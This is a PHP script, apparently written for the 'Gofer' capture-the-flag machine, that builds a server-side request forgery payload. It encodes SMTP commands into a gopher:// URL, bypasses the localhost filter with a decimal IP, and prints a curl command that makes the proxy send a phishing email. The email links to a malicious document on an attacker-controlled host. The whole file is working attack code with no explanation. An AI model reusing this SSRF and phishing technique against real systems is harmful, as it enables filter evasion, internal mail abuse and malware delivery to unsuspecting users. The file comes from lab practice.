<?php
        $commands = array(
                "MAIL FROM: <root@gofer.htb>",
                "RCPT TO: <jhudson@gofer.htb>",
                "DATA",
                "Subject: Important mail",
                "Click on this link: http://10.10.10.10/phish.odt for more info",    // Change the IP
                "."
        );
$payload = implode('%0A', $commands); 
$encoded_payload = urlencode($payload);
echo 'curl -X POST http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/_' . $encoded_payload;
?>
